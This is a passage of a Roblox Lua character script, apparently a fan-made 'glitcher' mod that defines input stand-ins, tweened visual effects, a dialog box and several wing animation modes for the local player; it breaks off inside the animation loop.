wait(0.5)
local Player = game:GetService("Players").LocalPlayer --<=== Replace With Your Name
-- < // Chromospheric Glitcher, The third -spheric related Glitcher. \\ > -- Spherespheric glitcher  w h e n ?
--[[
       [          // Developers \\         ]
       [          StratosphericAero        ]
       [             divineMoai            ]
       [   KnottyEeveez/MiserableLeafeon   ]
       [               loplkc              ]
	   [           GunsForGunsKidd         ]
]]

Pl =  Player
Player = Pl
char = Pl.Character
Hum = char:FindFirstChildOfClass("Humanoid")
CFR = CFrame.new
script.Parent = Player.Character
local CAS = {Actions={}}
local Event = Instance.new("RemoteEvent")
Event.Name = "UserInput_Event"
Event.Parent = Player.Character
local fakeEvent = function()
	local t = {_fakeEvent=true}
	t.Connect = function(self,f)self.Function=f end
	t.connect = t.Connect
	return t
end
local m = {Target=nil,Hit=CFrame.new(),KeyUp=fakeEvent(),KeyDown=fakeEvent(),Button1Up=fakeEvent(),Button1Down=fakeEvent()}
local UIS = {InputBegan=fakeEvent(),InputEnded=fakeEvent()}
function CAS:BindAction(name,fun,touch,...)
	CAS.Actions[name] = {Name=name,Function=fun,Keys={...}}
end
function CAS:UnbindAction(name)
	CAS.Actions[name] = nil
end
local function te(self,ev,...)
	local t = m[ev]
	if t and t._fakeEvent and t.Function then
		t.Function(...)
	end
end
m.TrigEvent = te
UIS.TrigEvent = te

Mouse,mouse,UserInputService,ContextActionService = m,m,UIS,CAS

-- hitboxes/effects setup

local root = char:FindFirstChild'HumanoidRootPart'

local notReplicatedFirst
if not workspace:FindFirstChild("NotReplicatedFirst") then
	notReplicatedFirst = Instance.new("Folder",workspace)
	notReplicatedFirst.Name = "NotReplicatedFirst"
else
	notReplicatedFirst = workspace:FindFirstChild("NotReplicatedFirst")
end

function stupidAnimThing()
local module = {}
cf,ang,angles,rad,sin,cos,rand,v3  = CFrame.new, CFrame.Angles,CFrame.Angles, math.rad, math.sin, math.cos, math.random, Vector3.new
NS,NSK,CS,CSK,NR = NumberSequence.new, NumberSequenceKeypoint.new, ColorSequence.new, ColorSequenceKeypoint.new, NumberRange.new
tweenDisable = {}

local resources

function module.makeSureResourcesIsThere()

end

function TweenAnimateC(object,Aniim,time,easingstyle,easingdirection,repet,reverse,deelay)
	if tweenDisable and typeof(tweenDisable) == typeof({}) then for i,v in pairs(tweenDisable) do if v == object then return end end end
	local infos=TweenInfo.new(time or (20/60),Enum.EasingStyle[easingstyle or "Linear"],Enum.EasingDirection[easingdirection or "InOut"],repet or 0,reverse or false,deelay or 0)
	local tween=game:GetService("TweenService"):Create(object,infos,Aniim)
	tween:Play()
	return tween
end

function TweenAnimate(object,Aniim,c0)
	local infos=TweenInfo.new(30/60,Enum.EasingStyle["Quad"],Enum.EasingDirection["Out"],0,false,0)
	Aniim = {C0=Aniim}
	local tween=game:GetService("TweenService"):Create(object,infos,Aniim)
	tween:Play()
	return tween
end

function module.RTweenAnimate(swait,object,Aniiim,time,easingstyle,easingdirection,repet,reverse,deelay)
	return TweenAnimateC(object,Aniiim,time,easingstyle,easingdirection,repet,reverse,deelay)
end



function module.weirdeff(swait,name,startprop,endprop,timer,easing,easing2,repet,reverse,del,deb)
	local e = effectstuff[name]:Clone()
	for d,g in pairs(startprop) do
		e[d] = g
	end
	e.Name = "Effect"
	e.Parent = workspace:FindFirstChild("Effects") or workspace
	local er = TweenAnimateC(e,endprop,timer,easing,easing2,repet,reverse,del)
	er.Completed:connect(function()
		if deb then return end
		e:Destroy()
	end)
	return e
end

--sequence entry format:
--{color,size,cframe,transparency,time to next,easingstyle,easingdirection}

ts = game:GetService("TweenService") --ya'll are apes for not making a variable for this
function module.horseEff(typ,material,sequence) --h osde efect, similar to weirdeff but with that signature loplkc flavor
	spawn(function()
		local o = typ[1]:Clone()
		o.CastShadow = false
		o.Anchored = true
		o.CanCollide = false
		o.Material = material
		o.Color = sequence[1][1]
		o.Size = sequence[1][2]*(typ[2] or Vector3.new(1,1,1))
		o.CFrame = sequence[1][3]
		o.Transparency = sequence[1][4]
		o.Parent = workspace:FindFirstChild("Effects") or workspace --thanks moai
		for i = 2, #sequence do
			local g = {}
			g.Color = sequence[i][1]
			g.Size = sequence[i][2]*(typ[2] or Vector3.new(1,1,1))
			g.CFrame = (type(sequence[i][3]) == "table" and o.CFrame*sequence[i][3][1]) or sequence[i][3]
			g.Transparency = sequence[i][4]
			local tinfo = TweenInfo.new(sequence[i-1][5] or sequence[1][5],sequence[i-1][6] or sequence[1][6],sequence[i-1][7] or sequence[1][7])
			ts:Create(o,tinfo,g):Play()
			wait(sequence[i-1][5] or sequence[1][5])
		end
		o:Destroy()
	end)
end

function module.EpicEffect(swait,DataTable,C1,C2,C3,C4)
	local efx = nil
	local mesh = nil
	local EFXFolder = workspace:FindFirstChild("Effects") or workspace
	-- [Properties] --
	local lifetime = (DataTable.Life or 15)
	local mshtype = (DataTable.Type or "Block")
	local size1 = (DataTable.Size1 or Vector3.new(1,1,1))
	local size2 = (DataTable.Size2 or size1)
	local trsp1 = (DataTable.Transparency1 or 0)
	local trsp2 = (DataTable.Transparency2 or trsp1)
	local color1 = (DataTable.Color1 or "C1")
	local color2 = (DataTable.Color2 or false)
	local updatecolors = (DataTable.UpdateColors or false) -- needs to be true if color2 is used
	local meterial = (DataTable.Meterial or "Neon")
	local cframe = (DataTable.Pos1)
	local rotationX = (DataTable.RotationX or 0)
	local rotationY = (DataTable.RotationY or 0)
	local rotationZ = (DataTable.RotationZ or 0)
	local CastShadows = (DataTable.CastShadows or false)
	local moveto = (DataTable.Pos2 or cframe.p+Vector3.new(0,0.0001,0))
	local DecalGlowMulti = (DataTable.DecalGlowMulti or 10)
	local Light = (DataTable.UseLight or false)
	local LightB1 = (DataTable.Brightness1 or 1)
	local LightB2 = (DataTable.Brightness2 or LightB1)
	local LightR = (DataTable.Range or 16)
	local LightC = (DataTable.LightColor or "PartColor")
	local LightS = (DataTable.LightShadows or true)
	-- [Properties End] --
	if moveto == cframe.p then moveto = cframe.p+Vector3.new(0,0.0001,0) end
	local DecalMesh = false
	if mshtype == "Block" then
		efx = Instance.new("Part",EFXFolder)
		efx.Name = "PrimitiveEfx"
		mesh = Instance.new("SpecialMesh",efx)
		mesh.MeshType = Enum.MeshType.Brick
	elseif mshtype == "Sphere" then
		efx = Instance.new("Part",EFXFolder)
		efx.Name = "PrimitiveEfx"
		mesh = Instance.new("SpecialMesh",efx)
		mesh.MeshType = Enum.MeshType.Sphere
	elseif mshtype == "Cylinder" then
		efx = Instance.new("Part",EFXFolder)
		efx.Name = "PrimitiveEfx"
		mesh = Instance.new("SpecialMesh",efx)
		mesh.MeshType = Enum.MeshType.Cylinder
	elseif mshtype == "Wedge" then
		efx = Instance.new("Part",EFXFolder)
		efx.Name = "PrimitiveEfx"
		mesh = Instance.new("SpecialMesh",efx)
		mesh.MeshType = Enum.MeshType.Wedge
	else
		if MeshBois:FindFirstChild(mshtype) then
			efx = MeshBois:FindFirstChild(mshtype):Clone()
			efx.Parent = EFXFolder
			efx.Name = "Effect"
			if efx:FindFirstChildOfClass("Decal") then
				DecalMesh = true
			end
		end
	end
	if not efx then warn("The mesh "..mshtype.." was not found!") return false end
	local PL
	if Light == true then
		PL = Instance.new("PointLight",efx)
		PL.Brightness = LightB1
		PL.Range = LightR
		PL.Shadows = LightS
	end
	if mesh ~= nil then
		mesh.Scale = size1
		efx.Size = Vector3.new(1,1,1)
	else
		efx.Size = size1
	end
	efx.Anchored = true
	efx.CanCollide = false
	local EfxMainColor
	if color1 == "C1" then
		EfxMainColor = C1
	elseif color1 == "C2" then
		EfxMainColor = C2
	elseif color1 == "C3" then
		EfxMainColor = C3
	elseif color1 == "C4" then
		EfxMainColor = C4
	else
		EfxMainColor = color1
	end
	efx.Color = EfxMainColor
	if Light == true and LightC == "PartColor" then
		PL.Color = EfxMainColor
	elseif Light == true then
		PL.Color = LightC
	end
	local EfxMainColorDecal = Color3.new(EfxMainColor.R*DecalGlowMulti,EfxMainColor.G*DecalGlowMulti,EfxMainColor.B*DecalGlowMulti)
	for i,v in pairs(efx:GetChildren()) do
		if v:IsA("Decal") then
			v.Color3 = EfxMainColorDecal
		end
	end
	efx.Material = meterial
	efx.CFrame = cframe
	efx.CastShadow = CastShadows
	if DecalMesh then
		efx.Transparency = 1
		for i,v in pairs(efx:GetChildren()) do
			if v:IsA("Decal") then
				v.Transparency = trsp1
			end
		end
	else
		efx.Transparency = trsp1
	end
	coroutine.resume(coroutine.create(function()
		local EfxFinalColor
		for i = 1, lifetime+1 do	
			if efx ~= nil then
				swait()
				if updatecolors == true then
					if color2 ~= false then
						local r=efx.Color.r - ((EfxMainColor.r - color2.r)/lifetime) 
						local g=efx.Color.g - ((EfxMainColor.g - color2.g)/lifetime)
						local b=efx.Color.b - ((EfxMainColor.b - color2.b)/lifetime)
						if r >= 255 then r = 255 end
						if g >= 255 then g = 255 end
						if b >= 255 then b = 255 end
						if r <= 0 then r = 0 end
						if g <= 0 then g = 0 end
						if b <= 0 then b = 0 end
						EfxFinalColor = Color3.new(r,g,b)
					elseif color1 == "C1" then
						EfxFinalColor = C1
					elseif color1 == "C2" then
						EfxFinalColor = C2
					elseif color1 == "C3" then
						EfxFinalColor = C3
					elseif color1 == "C4" then
						EfxFinalColor = C4
					else
						EfxFinalColor = color1
					end
					efx.Color = EfxFinalColor
					if Light == true and LightC == "PartColor" then
						PL.Color = EfxFinalColor
					elseif Light == true then
						PL.Color = LightC
					end
					local EfxMainColorDecal = Color3.new(EfxFinalColor.R*DecalGlowMulti,EfxFinalColor.G*DecalGlowMulti,EfxFinalColor.B*DecalGlowMulti)
					for i,v in pairs(efx:GetChildren()) do
						if v:IsA("Decal") then
							v.Color3 = EfxMainColorDecal
						end
					end
				end
				if mesh ~= nil then
					mesh.Scale = mesh.Scale - ((size1-size2)/lifetime)
				else
					efx.Size = efx.Size - ((size1-size2)/lifetime)
				end
				if Light == true then
					PL.Brightness = PL.Brightness - ((LightB1-LightB2)/lifetime)
				end
				if DecalMesh == true then
					for i,v in pairs(efx:GetChildren()) do
						if v:IsA("Decal") then
							v.Transparency = v.Transparency - ((trsp1-trsp2)/lifetime)
						end
					end
				else
					efx.Transparency = efx.Transparency - ((trsp1-trsp2)/lifetime)
				end
				efx.CFrame = efx.CFrame*CFrame.Angles(math.rad(rotationX),math.rad(rotationY),math.rad(rotationZ))
				local Orientation = efx.Orientation
				efx.CFrame = CFrame.new(efx.Position,moveto)*CFrame.new(0,0,-((cframe.p - moveto).Magnitude/lifetime))
				efx.Orientation = Orientation
			else
				return
			end
		end
		efx:Destroy()
	end))
end

function module.weldedweirdeff(swait,name,part,parenttopart,wstartc0,startprop,startprop1,wendc0,endprop,endprop1,timer,easing,easing2,repet,reverse,del,deb,marazm)
	local e = effectstuff[name]:Clone()
	for i,v in pairs(e:GetChildren()) do
		if v:IsA("Decal") then
			for d,g in pairs(startprop1) do
				v[d] = g
			end
		end
	end
	for d,g in pairs(startprop) do
		e[d] = g
	end
	e.Anchored = false
	e.CanCollide = false
	e.Massless = true
	e.Name = "Effect"
	local weld = Instance.new("Motor6D")
	weld.Part0 = part
	weld.Part1 = e
	weld.C0 = wstartc0
	weld.Parent = e
	e.Parent = (parenttopart and part) or workspace:FindFirstChild("Effects") or workspace
	local er = TweenAnimateC(e,endprop,timer,easing,easing2,repet,reverse,del)
	TweenAnimateC(weld,{C0=wendc0},timer,easing,easing2,repet,reverse,del)
	for i,v in pairs(e:GetChildren()) do
		if v:IsA("Decal") then
			TweenAnimateC(v,endprop1,timer,easing,easing2,repet,reverse,del)
		end
	end
	if not deb then
		er.Completed:connect(function()
			e:Destroy()
		end)
	end
	return e
end

function module.dialog(swait,Mode,char,name,texts,image,times,sound,imagestuff,noup)
	local epic = Instance.new("Sound")
	epic.SoundId = sound or "rbxassetid://525200869"
	epic.Volume = .5
	epic.Parent = workspace
	epic:Play()
	local MAINRUINCOLOR = Mode["Colors"][1]
	local MAINRUINCOLOR2 = Mode["Colors"][2]
	local chat = resources.chat:Clone()
	chat.Frame.name.Text = name
	chat.Frame.TextLabel.Text = name
	chat.Frame.image.Image = image
	chat.Frame.name.TextColor3 = MAINRUINCOLOR2:lerp(Color3.new(1,1,1),.5)
	chat.Frame.name.TextStrokeColor3 = MAINRUINCOLOR:lerp(Color3.new(0,0,0),.5)
	chat.Frame.name.BorderColor3 = MAINRUINCOLOR
	chat.Frame.name.BackgroundColor3 = MAINRUINCOLOR2:lerp(Color3.new(0,0,0),.5)
	chat.Frame.image.BorderColor3 = MAINRUINCOLOR
	chat.Frame.image.BackgroundColor3 = MAINRUINCOLOR2:lerp(Color3.new(0,0,0),.25)
	chat.Frame.TextLabel.BorderColor3 = MAINRUINCOLOR
	chat.Frame.TextLabel.BackgroundColor3 = MAINRUINCOLOR2:lerp(Color3.new(1,1,1),.125)
	if image == "player" then
		local fdansf = Instance.new("ViewportFrame")
		fdansf.Size = UDim2.new(1,0,1,0)
		fdansf.BackgroundTransparency = 1
		fdansf.Parent = chat.Frame.image
		chat.Frame.image.ImageTransparency = 1
		char.Archivable = true -- so cloning works
		local sss = char:Clone()
		sss:FindFirstChildOfClass("Humanoid").DisplayDistanceType = Enum.HumanoidDisplayDistanceType.None
		for i,v in pairs(sss:GetDescendants()) do
			if v:IsA("Script") then v:Destroy() end
			if v:IsA("Sound") then v:Destroy() end
			if v:IsA("BasePart") then v.Anchored = true end
			if v:IsA("GuiBase") then v:Destroy() end
		end
		sss:SetPrimaryPartCFrame(CFrame.new(0,0,0))
		sss.Parent = fdansf
		local came = Instance.new("Camera")
		fdansf.CurrentCamera = came
		came.CFrame = sss.Torso.CFrame*CFrame.new(0,1.25,-5)
		came.CFrame = came.CFrame:lerp(CFrame.new(came.CFrame.p,sss.Head.CFrame.p),.95)
		came.Parent = fdansf
	end
	for d,g in pairs(imagestuff or {}) do
		chat.Frame.image[d] = g
	end
	local upp = 0
	if not noup then
		for i,v in pairs(game.Players.LocalPlayer.PlayerGui:GetChildren()) do
			if v.Name == "chat" then
				upp = upp - 1
			end
		end
	else
		upp = noup
	end
	chat.Parent = game.Players.LocalPlayer.PlayerGui
	TweenAnimateC(chat.Frame,{AnchorPoint=Vector2.new(0,1),Position = UDim2.new(0,10,1,-10 + 200*upp)},0.5,"Quint","Out",0,false,0)
	swait(10)
	for i,text in pairs(texts) do
		for x,v in pairs(string.split(text,"")) do
			chat.Frame.TextLabel.actualtext.Text = chat.Frame.TextLabel.actualtext.Text .. v
			swait(2)
		end
		swait(times[i]*60)
		chat.Frame.TextLabel.actualtext.Text = ""
	end
	chat.Name = "dumpy"
	TweenAnimateC(chat.Frame,{AnchorPoint=Vector2.new(0,0),Position = UDim2.new(0,10,1,10)},0.75,"Quint","In",0,false,0)
	wait(0.75)
	chat:Destroy()
	epic:Destroy()
end

function module.slashy(swait,cfr,color,sizex,sizey,spins,spinspeeds,wahoo)
	coroutine.resume(coroutine.create(function()
		for i = 1,spins do
			local t = {-.5,-.5}
			if i == 1 then
				t[1] = 1
			elseif i == spins then
				t[2] = 1
			end
			local eas = "Linear"
			if i == spins then
				eas = "Sine"
			end
			local e = module.weirdeff(swait,"woosh2",{ -- part start properties
				Size=Vector3.new(sizex[i],sizex[i],sizey),
				Transparency = 1,
				CFrame = cfr*angles(0,math.rad(180),math.rad((wahoo or 179)*(i-1)))*cf(0,0,sizey/10)
			},{ -- decal start properties
				Color3=glowify(color),
				Transparency = t[1],
			},{ -- part end properties
				Size=Vector3.new(sizex[i+1],sizex[i+1],sizey),
				CFrame = cfr*angles(0,math.rad(180),math.rad((wahoo or 179)*i))*cf(0,0,sizey/10)
			},{ -- decal end properties
				Transparency = t[2]
			},spinspeeds[i]/60,eas,"Out",nil,nil,nil,true)
			local e2 = module.weirdeff(swait,"woosh",{ -- part start properties
				Size=Vector3.new(sizex[i],sizex[i],sizey),
				Transparency = 1,
				CFrame = cfr*angles(0,math.rad(0),math.rad(-(wahoo or 179)*(i-1)))*cf(0,0,sizey/10)
			},{ -- decal start properties
				Color3=glowify(color),
				Transparency = t[1],
			},{ -- part end properties
				Size=Vector3.new(sizex[i],sizex[i],sizey),
				CFrame = cfr*angles(0,math.rad(0),math.rad(-(wahoo or 179)*i))*cf(0,0,sizey/10)
			},{ -- decal end properties
				Transparency = t[2]
			},spinspeeds[i]/60,eas,"Out",nil,nil,nil,true)
			swait(spinspeeds[i]-1)
			e:Destroy()
			e2:Destroy()
		end
	end))
end

function module.weldedslashy(swait,part,c0,color,sizex,sizey,spins,spinspeeds,wahoo)
	coroutine.resume(coroutine.create(function()
		for i = 1,spins do
			local t = {-.5,-.5}
			if i == 1 then
				t[1] = 1
			elseif i == spins then
				t[2] = 1
			end
			local eas = "Linear"
			if i == spins then
				eas = "Sine"
			end
			local e = module.weldedweirdeff(swait,"woosh2",part,false,
				c0*angles(0,math.rad(180),math.rad((wahoo or 179)*(i-1)))*cf(0,0,sizey/10),{ -- part start properties
					Size=Vector3.new(sizex[i],sizex[i],sizey),
					Transparency = 1,
				},{ -- decal start properties
					Color3=glowify(color),
					Transparency = t[1],
				},c0*angles(0,math.rad(180),math.rad((wahoo or 179)*i))*cf(0,0,sizey/10),{ -- part end properties
					Size=Vector3.new(sizex[i+1],sizex[i+1],sizey),
				},{ -- decal end properties
					Transparency = t[2]
				},spinspeeds[i]/60,eas,"Out",nil,nil,nil,true)
			local e2 = module.weldedweirdeff(swait,"woosh",part,false,
				c0*angles(0,math.rad(0),math.rad(-(wahoo or 179)*(i-1)))*cf(0,0,sizey/10),{ -- part start properties
					Size=Vector3.new(sizex[i],sizex[i],sizey),
					Transparency = 1,
				},{ -- decal start properties
					Color3=glowify(color),
					Transparency = t[1],
				},c0*angles(0,math.rad(0),math.rad(-(wahoo or 179)*i))*cf(0,0,sizey/10),{ -- part end properties
					Size=Vector3.new(sizex[i+1],sizex[i+1],sizey),
				},{ -- decal end properties
					Transparency = t[2]
				},spinspeeds[i]/60,eas,"Out",nil,nil,nil,true)
			swait(spinspeeds[i]-1)
			e:Destroy()
			e2:Destroy()
		end
	end))
end

function rang(x,y,z)
	return ang(rad(x or 0),rad(y or 0),rad(z or 0))
end

function randr(maxX,maxY,maxZ)
	return CFrame.Angles(rad(rand(-(maxX or 360),(maxX or 360))),rad(rand(-(maxY or 360),(maxY or 360))),rad(rand(-(maxZ or 360),(maxZ or 360))))
end

function glowify(c,ret)
	local e = Color3.fromRGB((c.R*50)^2,(c.G*50)^2,(c.B*50)^2)
	return (ret or Color3.new)(e.R,e.G,e.B)
end

function rayCast(Pos, Dir, Max, Ignore)  -- Origin Position , Direction, MaxDistance , IgnoreDescendants
	return workspace:FindPartOnRay(Ray.new(Pos, Dir.unit * (Max or 999.999)), Ignore) 
end 

function AFrame(one,two,three,four,five,six) --why has nobody else made a function like this yet? -loplkc
	return(CFrame.new(one,two,three)*CFrame.fromEulerAnglesXYZ(rad(four),rad(five),rad(six)))
end

function module.animsandstuff(swait,wings,WAnimV,wepV,chr)
	print("hekc")
	--weapon stuff
	local scythe = chr:WaitForChild("Scythe",2)
	local scEfWeld = scythe.SwirlEffect.Motor6D
	local sewco = scEfWeld.C0
	local scwW = {}
	local pcwC0 = {}
	for i = 1, 3 do
		scwW[i] = scythe:FindFirstChild("Shard" .. tostring(i)).Motor6D
		pcwC0[i] = scwW[i].C0
	end
	--the rest
	local sine = 0
	while swait() do
		local WAnim,shownLeft,shownRight = WAnimV.Value,WAnimV.shownLeft.Value,WAnimV.shownRight.Value
		if WAnimV.Value == "Autumn" then
			-- guns's funni wing anim
			for i = 1, shownLeft do
				local step = sine - 15*i
				wings["lwingwelds"][i].C0=(CFrame.new((#wings["lwingwelds"]/2)+(shownLeft)*math.sin(step/46),(shownLeft/8)+(shownLeft/4)*math.sin(step/23),i/10)*CFrame.Angles(math.rad(0),math.rad(i/5+2*math.sin(step/46)),math.rad(90+50*math.sin(step/46))))
			end
			for i = 1, shownRight do
				local step = sine - 15*i
				wings["rwingwelds"][i].C0=(CFrame.new(-(#wings["rwingwelds"]/2)-(shownRight)*math.sin(step/46),(shownRight/8)+(shownRight/4)*math.sin(step/23),i/10)*CFrame.Angles(math.rad(0),math.rad(i/5+2*math.sin(step/46)),math.rad(-90-50*math.sin(step/46))))
			end
			-- absolutely skidded wing anim with some tweaks
			local heck = ({top=2,mid=0,bot=-2})
			for i,v in pairs(wings["miniweldsl"]) do
				local step = sine - 5*i
				v.C0 = rang(90+((30 + 10*sin(sine/32))*(heck[v.Parent.Name] or 0)))*CFrame.Angles(math.rad(0),math.rad(step),math.rad(0)) * cf(0,-0.6+0.2*math.tan(math.sin(step/69)),0)
			end
			for i,v in pairs(wings["miniweldsr"]) do
				local step = sine - 5*i
				v.C0 = rang(-90+((30 + 10*sin(sine/32))*(heck[v.Parent.Name] or 0)))*CFrame.Angles(math.rad(0),math.rad(step),math.rad(0)) * cf(0,-0.6+0.2*math.tan(math.sin(step/69)),0)
			end
		elseif WAnimV.Value == "SpinningCore" then -- extra wing anims
			for i,v in pairs(wings["lwingwelds"]) do
				local step = sine - 15*i
				v.C0=(CFrame.new(0,0,0)*CFrame.Angles(math.rad(90),math.rad(sine+((360/shownLeft)*i)),math.rad(180))*CFrame.new(1,0,0))
			end
			for i,v in pairs(wings["rwingwelds"]) do
				local step = sine - 15*i
				v.C0=(CFrame.new(0,0,0)*CFrame.Angles(math.rad(-90),math.rad(sine+((360/shownRight)*i)),math.rad(35+15*math.sin(sine/45)))*CFrame.new(1,-1-1*math.sin(sine/45),0))
			end
			local heck = ({top=2,mid=0,bot=-2})
			for i,v in pairs(wings["miniweldsl"]) do
				local step = sine - 5*i
				v.C0 = rang(90+((30 + 10*sin(sine/32))*(heck[v.Parent.Name] or 0)))*CFrame.Angles(math.rad(0),math.rad(step),math.rad(0)) * cf(0,-0.6+0.2*math.tan(math.sin(step/69)),0)
			end
			for i,v in pairs(wings["miniweldsr"]) do
				local step = sine - 5*i
				v.C0 = rang(-90+((30 + 10*sin(sine/32))*(heck[v.Parent.Name] or 0)))*CFrame.Angles(math.rad(0),math.rad(step),math.rad(0)) * cf(0,-0.6+0.2*math.tan(math.sin(step/69)),0)
			end
		elseif WAnimV.Value == "Sun" then
			for i,v in pairs(wings["lwingwelds"]) do
				local step = sine - 15*i
				v.C0=(CFrame.new(0,0,0)*CFrame.Angles(math.rad(0),math.rad(0),math.rad(sine+((360/shownLeft)*i)))*CFrame.new(0-2*math.sin(sine/25),0,0))
			end
			for i,v in pairs(wings["rwingwelds"]) do
				local step = sine - 15*i
				v.C0=(CFrame.new(0,0,0)*CFrame.Angles(math.rad(0),math.rad(180),math.rad(sine+((360/shownRight)*i)))*CFrame.new(0,-2-4*math.sin(sine/50),-0.05))
			end
			for i,v in pairs(wings["miniweldsl"]) do
				local step = sine - 5*i
				v.C0 = CFrame.Angles(math.rad(step+(60*i)),math.rad(0),math.rad(0)) * cf(0,-0.25+0.1*math.cos(sine/45),0)
			end
			for i,v in pairs(wings["miniweldsr"]) do
				local step = sine - 5*i
				v.C0 = CFrame.Angles(math.rad(step+180+(60*i)),math.rad(0),math.rad(0)) * cf(0,-0.25+0.1*math.cos(sine/45),0)
			end
		elseif WAnimV.Value == "Wacky1" then
			for i,v in pairs(wings["lwingwelds"]) do
				local step = sine - 15*i
				v.C0=(CFrame.new(1.25*math.sin(sine/40),0,0)*CFrame.Angles(math.rad(0),math.rad(0),math.rad((45+((90/shownLeft)*i))+15*math.sin(sine/40)))*CFrame.new((i*0.25)+(i*0.25)*math.cos(sine/40),-(2+i*0.5)-(2+i*0.5)*math.cos(sine/40),(0.2+i*0.25)+(0.2+i*0.25)*math.cos(sine/40)))
			end
			for i,v in pairs(wings["rwingwelds"]) do
				local step = sine - 15*i
				v.C0=(CFrame.new(-1.25*math.sin(sine/40),0,0)*CFrame.Angles(math.rad(0),math.rad(0),math.rad((-45-((90/shownRight)*i))-15*math.sin(sine/40)))*CFrame.new(-(i*0.25)-(i*0.25)*math.cos(sine/40),-(2+i*0.5)-(2+i*0.5)*math.cos(sine/40),(0.2+i*0.25)+(0.2+i*0.25)*math.cos(sine/40)))
			end
			local heck = ({top=2,mid=0,bot=-2})
			for i,v in pairs(wings["miniweldsl"]) do
				local step = sine - 5*i
				v.C0 = rang(90+((30 + 10*sin(sine/32))*(heck[v.Parent.Name] or 0)))*CFrame.Angles(math.rad(0),math.rad(step),math.rad(0)) * cf(0,-0.6+0.2*math.tan(math.sin(step/69)),0)
			end
			for i,v in pairs(wings["miniweldsr"]) do
				local step = sine - 5*i
				v.C0 = rang(-90+((30 + 10*sin(sine/32))*(heck[v.Parent.Name] or 0)))*CFrame.Angles(math.rad(0),math.rad(step),math.rad(0)) * cf(0,-0.6+0.2*math.tan(math.sin(step/69)),0)
			end
		elseif WAnimV.Value == "Butterfly" then
			for i,v in pairs(wings["lwingwelds"]) do
				local step = sine - 15*i
				v.C0=(CFrame.new(1,-1,0)*CFrame.Angles(math.rad(0),math.rad(0),math.rad(45+((90/shownLeft)*i)))*CFrame.Angles(0,0,math.rad(45*math.cos(sine/15))))
			end
			for i,v in pairs(wings["rwingwelds"]) do
				local step = sine - 15*i
				v.C0=(CFrame.new(-1,-1,0)*CFrame.Angles(math.rad(0),math.rad(0),math.rad(-45-((90/shownRight)*i)))*CFrame.Angles(0,0,math.rad(-45*math.cos(sine/15))) )
			end
			for i,v in pairs(wings["miniweldsl"]) do
				v.C0 = CFrame.Angles(math.rad(sine+(60*i)),math.rad(0),math.rad(0)) * cf(0,-0.15,0)
			end
			for i,v in pairs(wings["miniweldsr"]) do
				v.C0 = CFrame.Angles(math.rad(sine+180+(60*i)),math.rad(0),math.rad(0)) * cf(0,-0.15,0)
			end
		elseif WAnimV.Value == "ButterflySlow" then
			for i,v in pairs(wings["lwingwelds"]) do
				local step = sine - 15*i
				v.C0=(CFrame.new(1,-1,0)*CFrame.Angles(math.rad(0),math.rad(0),math.rad(45+((90/shownLeft)*i)))*CFrame.Angles(0,0,math.rad(45*math.cos(sine/45))))
			end
			for i,v in pairs(wings["rwingwelds"]) do
				local step = sine - 15*i
				v.C0=(CFrame.new(-1,-1,0)*CFrame.Angles(math.rad(0),math.rad(0),math.rad(-45-((90/shownRight)*i)))*CFrame.Angles(0,0,math.rad(-45*math.cos(sine/45))) )
			end
			for i,v in pairs(wings["miniweldsl"]) do
				v.C0 = CFrame.Angles(math.rad(sine+(60*i)),math.rad(0),math.rad(0)) * cf(0,-0.15,0)
			end
			for i,v in pairs(wings["miniweldsr"]) do
				v.C0 = CFrame.Angles(math.rad(sine+180+(60*i)),math.rad(0),math.rad(0)) * cf(0,-0.15,0)
			end
		elseif WAnimV.Value == "ActualWings" then
			for i,v in pairs(wings["lwingwelds"]) do
				local step = (sine/1.25) - 10*i
				v.C0=cf(1,1.5,0)*rang(8 + 8*sin(step/32),-10 - i*10*sin(step/32),10*i + i*10*sin(step/32))*cf(2*i,.25*i + sin(step/32)*i*.5,0)*rang(4 + 4*sin(step/32),0,5*i + i*5*sin(step/32))
			end
			for i,v in pairs(wings["rwingwelds"]) do
				local step = (sine/1.25) - 10*i
				v.C0=cf(-1,1.5,0)*rang(8 + 8*sin(step/32),10 + i*10*sin(step/32),-10*i - i*10*sin(step/32))*cf(-2*i,.25*i + sin(step/32)*i*.5,0)*rang(4 + 4*sin(step/32),0,-5*i - i*5*sin(step/32))
			end
			for i,v in pairs(wings["miniweldsl"]) do
				v.C0 = CFrame.Angles(math.rad(sine+(60*i)),math.rad(0),math.rad(0)) * cf(0,-0.15,0)
			end
			for i,v in pairs(wings["miniweldsr"]) do
				v.C0 = CFrame.Angles(math.rad(sine+180+(60*i)),math.rad(0),math.rad(0)) * cf(0,-0.15,0)
			end
		elseif WAnimV.Value == "David" then
			for i,v in pairs(wings["lwingwelds"]) do
				local sine = sine - 7.5*i
				v.C0 = rang(0,0,90 + sin(sine/48)*(90/#wings["lwingwelds"])*(#wings["lwingwelds"] - i)) * cf(0,-1.5*i,0) * rang(0,0,-cos(sine/48)*15*i)
			end
			for i,v in pairs(wings["rwingwelds"]) do
				local sine = sine - 7.5*i
				v.C0 = rang(0,0,-90 - sin(sine/48)*(90/#wings["lwingwelds"])*(#wings["rwingwelds"] - i)) * cf(0,-1.5*i,-.2*i) * rang(0,0,cos(sine/48)*15*i)
			end
			for i,v in pairs(wings["miniweldsl"]) do
				v.C0 = CFrame.Angles(math.rad(sine+(60*i)),math.rad(0),math.rad(0)) * cf(0,-0.15,0)
			end
			for i,v in pairs(wings["miniweldsr"]) do
				v.C0 = CFrame.Angles(math.rad(sine+180+(60*i)),math.rad(0),math.rad(0)) * cf(0,-0.15,0)
			end
		else
			-- skidded nc wing anim for testing purposes
			for i = 1, shownLeft do
				local step = sine - 15*i
				wings["lwingwelds"][i].C0=(ang(0,0,rad(55+((i-1)*(105/shownLeft))+sin(step/64)*45))*cf(0,-3.5+cos(step/48),0)*ang(rad(5+sin(step/48)*10),0,rad(cos(step/64)*-20)))
			end
			for i = 1, shownRight do
				local step = sine - 15*i
				wings["rwingwelds"][i].C0=(ang(0,0,rad(-55-((i-1)*(105/shownRight))-sin(step/64)*45))*cf(0,-3.5+cos(step/48),0)*ang(rad(5+sin(step/48)*10),0,rad(cos(step/64)*20)))
			end
			-- absolutely not skidded wing anim
			local heck = ({top=1,mid=0,bot=-1})
			for i,v in pairs(wings["miniweldsl"]) do
				v.C0 = rang(90+((30 + 10*sin(sine/32))*(heck[v.Parent.Name] or 0))) * cf(0,-.3,0)
			end
			for i,v in pairs(wings["miniweldsr"]) do
				v.C0 = rang(-90+((30 + 10*sin(sine/32))*(heck[v.Parent.Name] or 0))) * cf(0,-.3,0)
			end
		end
		if wepV.Value == "Scythe" then
